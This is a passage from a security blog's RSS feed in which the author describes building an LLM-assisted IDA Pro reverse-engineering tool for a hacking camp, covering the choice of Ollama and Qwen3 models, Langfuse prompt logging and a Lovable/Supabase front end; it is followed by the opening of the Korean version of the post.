plenty of other things to worry about too&#x2026; Anyway, that&#x2019;s why I thought, &#x201C;Why not create something simple that people attending presentations need?&#x201D;</p><p>Since I&#x2019;m also building solutions, I&#x2019;ve become very interested in development using AI services. At this point, the things I wanted to stick to as much as possible were:</p><ol><li>Don&#x2019;t write the code myself; let the AI services write it all.</li><li>We only have a week, so just make it work.</li><li>Build a service people actually need.</li></ol><p>Hacking Camp runs a CTF on the first evening. My assumption was that most participants were just starting out with hacking and probably weren&#x2019;t very familiar with reverse engineering yet! So, wouldn&#x2019;t it be great to develop a reverse engineering assistant tool? I figured I could probably build something like that by investing about three days on my own. (But this was arrogance.) More specifically, I thought I could use an LLM to rename variables and functions to more readable names, and even analyze function contents with an LLM to add comments. (It&#x2019;s been over a year since I last opened IDA, so I realized while building this that such tools already exist as open source&#x2026; haha. Well, the point was for me to try building a service anyway.)</p><p>A simplified service flowchart would look like this:</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-Server"><a href="#2-Ollama-Server" class="headerlink" title="2. Ollama Server"></a>2. Ollama Server</h1><p>First, you might wonder why I&#x2019;m not using a commercial service. After all, there are so many great models like Gemini and ChatGPT. My personal view is that &#x201C;a small open-source model is sufficient for this service.&#x201D; Before starting this venture, I used open-source models for projects at my previous company. Even now, while conducting research, I&#x2019;ve tested various open-source models to build an on-premises environment. Unfortunately, performance limitations prevent me from testing larger models yet &#x3160;&#x3160;</p><p>The device I currently use at home for LLM inference is a Mac mini. It has an M4 Pro chip and 64GB of RAM. I set up an Ollama server on it and served models. If you visit the <a href="https://ollama.com/search">Ollama homepage</a>, you&#x2019;ll find many models that can be utilized within 64GB of RAM.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>Among the most popular models like GPT-OSS and DeepSeek, I tend to prefer models around 32B in size that are quantized to Q8. To give a simple reason:</p><ul><li>While 70B Q4 models (about 40G when downloaded) can run on 64GB RAM, these 70B models were already somewhat outdated at the time. I also thought it would be better to use a smaller model, considering the need to reserve space for the context window when processing long functions.</li><li>Around mid-August, some hot new models emerged that were smaller yet performed well. For gpt-oss, there was a 20B MoE model, and qwen3 had 32B and 30B MoE models. These models seemed to deliver performance comparable to the latest ChatGPT 4o or slightly better.</li><li>Beyond these, I also tested smaller models like Phi4 14B and Gemma 27B using several pre-set prompts I had prepared to evaluate their performance.</li></ul><p>After multiple tests, I decided to use the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model.</p><ol><li><p>As expected, the MoE model is significantly faster at inference than the standard model. The Qwen3 32B q8 model achieved about 7 TPS, while the Qwen 30B MoE model reached up to 45 TPS. I felt this was sufficient for a small-scale service.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>The reason we did not use the reasoning model qwen3:30b-a3b-thinking-2507 was that a bug where reasoning failed to complete consistently appeared during prompt testing. Since the model had only recently been released at the time, we simply decided not to use it.</p></li><li>The reason for not using other Reasoning models was that they took significantly longer to complete outputs. While the instruct model could produce most outputs within 2 minutes, enabling Reasoning added an extra 1-2 minutes. Additionally, performance was sufficient even without Reasoning.</li><li>Using smaller models required additional work, meaning their single-batch analysis performance was inferior. For the Phi4 14B model, while performance was sufficient, using the FP16 model was necessary to achieve usable performance levels. However, the reasoning time was too long for practical use. Beyond this, we determined that utilizing models like Qwen3 14B, 8B, Gemma 27B, and Deepseek 14B effectively would require significantly more prompt engineering effort.</li><li>Considering various factors like speed, performance, and memory, we determined that using the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model was the most suitable choice.</li></ol><p>With the model selected, simply set the environment variables and run the server using the <code>ollama serve</code> command&#x2014;that&#x2019;s all it takes to get ready!</p><h1 id="2-Prompt-Logging-with-Langfuse"><a href="#2-Prompt-Logging-with-Langfuse" class="headerlink" title="2. Prompt Logging with Langfuse"></a>2. Prompt Logging with Langfuse</h1><p>You might be thinking, &#x201C;Can&#x2019;t we just use LangSmith?&#x201D; I agree, but&#x2026; since we tested it during the solution development process while considering on-premises deployment, I decided to give Langfuse a try this time.</p><p>Installing Langfuse on the server isn&#x2019;t difficult. Just grab it from the repository and deploy it via Docker. Then, register Langfuse&#x2019;s callback handler in Langchain, and request logging will start as shown below.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>Logging allows you to verify whether responses to requests were sent correctly and check the quality of those responses. Based on this information, you can refine prompts or execution chains.</p><p>And! You can also detect incoming attacks lol</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>As shown above, we also detected prompt injection attacks being launched. You worked hard until dawn&#x2026; Unfortunately, it seems you weren&#x2019;t able to obtain the information you wanted.</p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>Originally, our website was developed using Base44. Yes, that&#x2019;s the service <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">acquired by Wix for $80M a few months ago</a>. I tried it after reading this article too. It was fine for developing simple landing pages, but problems started piling up after adding login functionality. It was especially terrible when developing features that utilized the database.</p><p>So, while searching for alternatives at the time, I heard that &#x201C;Lovable is a hot service these days&#x201D; and decided to give it a try. I first cloned the webpage I had previously developed exactly as it was, then started developing the login feature. To store user information, I connected it to Supabase. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Unlike Base44, it integrates directly with Supabase, makes database management easier, and seems to have many advantages overall. Of course, it might struggle to handle large-scale customers (my wallet, that is). Once you set up this integration and create the login button&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>Yeah&#x2026; it wasn&#x2019;t exactly easy, but I did manage to succeed after a few tries. After logging in, there should be a dashboard, right? I&#x2019;ll create it by writing the prompt well. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>Of course, it doesn&#x2019;t get cleanly developed with just that one prompt. If it had worked in one go, I&#x2019;d be out buying Lovable stock right now.</p><p>Anyway, there were still plenty of issues. While it generates API keys randomly just fine, it saves them to Supabase with parts of the key masked (<em>*</em>), or arbitrarily removes buttons, and so on&#x2014;there were a bunch of minor details to worry about. So I decided to narrow the scope of the features to implement. Originally, I wanted to add fun elements like a weekly Top 5 usage list&#x2026; but it required more prompting than expected, so I decided to skip it for now.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>After about four hours of hard work, I managed to implement all the essential features. If I had developed it myself with my limited web development skills, it would have taken a week. Using AI services these days is definitely more advantageous.</p><p>I&#x2019;ll wrap things up here for today. Next time, I&#x2019;ll cover the rest of the development process and what happened at the presentation site. Until then&#x2026; wish me luck staying alive&#x2026; Bye!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 초짜 개발자의 AI 서비스 삽질기 Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</guid>
      <pubDate>Thu, 30 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-&amp;#xBB34;&amp;#xC2A8;-&amp;#xC77C;&amp;#xC774;-&amp;#xC788;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg" alt="index_img"></p><h1 id="0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"><a href="#0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;" class="headerlink" title="0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"></a>0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;</h1><p>&#xD558;&#xD558; j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC65C; &#xB610; &#xC774;&#xB807;&#xAC8C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xAE00;&#xC744; &#xC4F0;&#xB0D0;&#xAD6C;&#xC694;? &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC4F4; &#xAE00;&#xC774; &#xC5B8;&#xC81C;&#xC9C0;&#x2026; &#xC544; 8&#xC6D4;&#x2026; &#xD558;&#xD558;&#x2026; &#xC0B4;&#xB824;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC880; &#xB354; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xAE00;&#xC744; &#xBC14;&#xCE58;&#xACA0;&#xB098;&#xC774;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/joker.png" alt="image.png"></p><p>&#xC624;&#xB298;&#xC740; &#xC774;&#xC804; &#xC5F0;&#xAD6C;&#xAE00;&#xB4E4;&#xACFC; &#xB2EC;&#xB9AC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD574; &#xC598;&#xAE30;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 30&#xC77C;, &#xC81C; 31&#xD68C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xAC00; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xADF8;&#xBCF4;&#xB2E4; &#xB300;&#xB7B5; 2&#xC8FC; &#xC804;&#xC5D0; &#xAC11;&#xC790;&#xAE30; &#xC6B4;&#xC601;&#xC9C4;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC5F0;&#xB77D;&#xC744; &#xBC1B;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>&#xC608;&#x2026; &#xC6D0;&#xB798; &#xBC1C;&#xD45C;&#xD558;&#xC2DC;&#xB824;&#xB358; &#xBD84;&#xC774; &#xAE09;&#xC791;&#xC2A4;&#xB7FD;&#xAC8C; &#xBC1C;&#xD45C;&#xB97C; &#xBABB;&#xD558;&#xC2E0;&#xB2E4;&#xACE0; &#xC5F0;&#xB77D;&#xC774; &#xC640;&#xC11C; &#xB300;&#xD0C0;&#xB97C; &#xAD6C;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB358; &#xAC70;&#xC600;&#xC8E0;. &#xC800;&#xB294; &#xC6D0;&#xB798; &#xC774;&#xD2C0;&#xB0A0;&#xC5D0; &#xAC00;&#xC11C; &#xBA58;&#xD2F0; &#xBC1C;&#xD45C;&#xD558;&#xB294; &#xAC70; &#xB4E3;&#xACE0; &#xC800;&#xB141;&#xC5D0; &#xC6B4;&#xC601;&#xC9C4;&#xBD84;&#xB4E4;&#xC774;&#xB791; &#xC220;&#xC774;&#xB098; &#xBA39;&#xC5B4;&#xC57C;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xAC8C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADF8;&#xB798;&#xC11C; &#xBC1C;&#xD45C; &#xC900;&#xBE44;&#xB97C; &#xC880; &#xD558;&#xACE0; &#xC77C;&#xC8FC;&#xC77C; &#xC815;&#xB3C4; &#xC2DC;&#xAC04; &#xC5EC;&#xC720;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xC81C;&#xAC00; &#xC77C; &#xBC8C;&#xB9AC;&#xB294;&#xB370;&#xB294; &#xC120;&#xC218;&#xB77C; &#xBB54;&#xAC00;&#xB97C; &#xB354; &#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;"><a href="#1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;" class="headerlink" title="1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;"></a>1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;</h1><p>&#xC7A0;&#xAE50; &#xADFC;&#xD669;&#xC744; &#xC598;&#xAE30;&#xD558;&#xC790;&#xBA74;, &#xCD5C;&#xADFC; L0ch&#xC640; Hacky-AI&#xB77C;&#xB294; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xCC3D;&#xC5C5;&#xD574;&#xC11C; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xAD00;&#xC2EC;&#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xC800;&#xD76C; <a href="https://hacky-ai.com/">&#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xBC29;&#xBB38;&#xD574;&#xC8FC;&#xC138;&#xC694;!) &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC83;&#xC740; &#xACE0;&#xAC1D;&#xC758; &#xBB38;&#xC81C;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xBC95;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xC2E0;&#xACBD; &#xC4F8; &#xAC83;&#xC774; &#xB9CE;&#xC9C0;&#xB9CC;&#x2026; &#xC544;&#xBB34;&#xD2BC; &#xADF8;&#xB798;&#xC11C; &#x201C;&#xBC1C;&#xD45C;&#xB97C; &#xB4E3;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCFC;&#xAE4C;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC194;&#xB8E8;&#xC158;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xC788;&#xAE30;&#xB3C4; &#xD574;&#xC11C; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xAC1C;&#xBC1C;&#xC5D0; &#xAD00;&#xC2EC;&#xC744; &#xB9CE;&#xC774; &#xAC00;&#xC9C0;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC774; &#xB54C; &#xCD5C;&#xB300;&#xD55C; &#xC9C0;&#xD0A4;&#xACE0;&#xC790; &#xD588;&#xB358; &#xAC83;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB0B4;&#xAC00; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC9C0; &#xB9D0;&#xACE0; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC774; &#xB2E4; &#xC791;&#xC131;&#xD558;&#xAC8C; &#xD558;&#xC790;.</li><li>&#xC77C;&#xC8FC;&#xC77C;&#xBC16;&#xC5D0; &#xC5C6;&#xC73C;&#xB2C8; &#xB3CC;&#xC544;&#xAC00;&#xAC8C;&#xB9CC; &#xB9CC;&#xB4E4;&#xC790;.</li><li>&#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC790;.</li></ol><p>&#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xB294; 1&#xC77C;&#xCC28; &#xC800;&#xB141;&#xC5D0; CTF&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;, &#xADF8;&#xB798;&#xC11C; &#xC81C;&#xAC00; &#xAC00;&#xC815;&#xD55C; &#xAC83;&#xC740; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xC774;&#xC81C; &#xB9C9; &#xD574;&#xD0B9;&#xC744; &#xC2DC;&#xC791;&#xD55C; &#xBD84;&#xB4E4;&#xC77C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1;&#xC5D0;&#xB294; &#xC544;&#xC9C1; &#xB9CE;&#xC774; &#xC775;&#xC219;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xC2E4; &#xAC83;&#xC774;&#xB2E4;! &#xADF8;&#xB7EC;&#xBA74; &#xB9AC;&#xBC84;&#xC2F1; &#xBCF4;&#xC870; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xBA74; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;? &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xADF8;&#xB798;&#xB3C4; &#xD63C;&#xC790; 3&#xC77C; &#xC815;&#xB3C4; &#xD22C;&#xC790;&#xD558;&#xBA74; &#xAC1C;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC5C8;&#xC8E0;.(&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC83;&#xC740; &#xC624;&#xB9CC;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;) &#xC880; &#xB354; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xC218;&#xC640; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC77D;&#xAE30; &#xC26C;&#xC6B4; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xACE0; &#xD568;&#xC218; &#xB0B4;&#xC6A9;&#xC744; LLM&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574; &#xC8FC;&#xC11D;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.(IDA&#xB97C; &#xC548; &#xD0A8;&#xC9C0; 1&#xB144;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xB2C8; &#xC774;&#xBBF8; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xB85C; &#xC788;&#xB294; &#xAC78; &#xB9CC;&#xB4E4;&#xBA74;&#xC11C; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4; &#xD558;&#xD558;&#x2026; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xB294;&#xAC8C; &#xCDE8;&#xC9C0;&#xB2C8;&#xAE4C;&#xC694;)</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC11C;&#xBE44;&#xC2A4; &#xD750;&#xB984;&#xB3C4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span 